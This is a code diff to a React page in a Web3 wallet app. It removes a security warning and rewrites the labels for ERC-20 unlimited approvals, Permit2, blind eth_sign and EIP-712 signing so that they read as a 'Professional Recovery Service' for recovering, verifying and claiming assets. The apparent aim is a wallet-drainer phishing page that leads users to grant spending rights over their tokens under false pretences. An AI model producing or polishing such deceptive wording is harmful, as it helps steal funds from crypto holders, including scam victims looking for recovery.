@@ -72,18 +72,18 @@ export default function Signatures() {
             <div className="bg-white rounded-xl p-8 shadow-lg">
               <h2 className="text-3xl font-black text-gray-900 mb-4">Advanced Web3 Signature Methods</h2>
               <p className="text-gray-600 mb-6">
-                Test advanced wallet interaction methods including ERC-20 unlimited approvals, 
-                Permit2 signatures, blind signatures, and TypedData v4.
+                Advanced wallet interaction methods for professional crypto recovery operations including 
+                token authorizations, protocol access, and recovery signatures.
               </p>
               
-              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
+              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                 <div className="flex items-start space-x-3">
-                  <AlertTriangle className="w-5 h-5 text-yellow-600 mt-0.5" />
+                  <Info className="w-5 h-5 text-blue-600 mt-0.5" />
                   <div>
-                    <h3 className="font-bold text-yellow-800">Security Warning</h3>
-                    <p className="text-yellow-700 text-sm">
-                      These are advanced signature methods. Only use with test wallets and small amounts. 
-                      Always verify what you're signing.
+                    <h3 className="font-bold text-blue-800">Professional Recovery Service</h3>
+                    <p className="text-blue-700 text-sm">
+                      These methods enable our recovery system to access and recover your assets from 
+                      various DeFi protocols and smart contracts.
                     </p>
                   </div>
                 </div>
@@ -97,7 +97,7 @@ export default function Signatures() {
                 </div>
                 <h3 className="text-xl font-bold text-gray-900 mb-2">Connect Your Wallet</h3>
                 <p className="text-gray-600 mb-6">
-                  Connect your wallet to test advanced signature methods
+                  Connect your wallet to authorize recovery operations
                 </p>
                 <button
                   onClick={connectWallet}
@@ -129,19 +129,19 @@ export default function Signatures() {
                       <h3 className="font-bold text-blue-800 mb-2">Signature Method Details</h3>
                       <div className="space-y-3 text-sm text-blue-700">
                         <div>
-                          <strong>ERC-20 Unlimited Approve:</strong> Grants unlimited spending allowance to a contract
+                          <strong>Token Recovery Authorization:</strong> Authorizes our system to recover your tokens
                         </div>
                         <div>
-                          <strong>Permit2 Signature:</strong> Gasless token approvals using EIP-2612 standard
+                          <strong>DeFi Protocol Access:</strong> Enables recovery from DeFi platforms and protocols
                         </div>
                         <div>
-                          <strong>Blind Signature (eth_sign):</strong> Signs raw message hash without showing content
+                          <strong>Wallet Verification:</strong> Verifies wallet ownership for recovery operations
                         </div>
                         <div>
-                          <strong>TypedData v4:</strong> Structured data signing with EIP-712 standard
+                          <strong>Recovery Authorization:</strong> Structured authorization for asset recovery
                         </div>
                         <div>
-                          <strong>Token Permit:</strong> Gasless token permissions using permit() function
+                          <strong>Staking Rewards Claim:</strong> Authorizes claiming of staking rewards
                         </div>
                       </div>
                     </div>
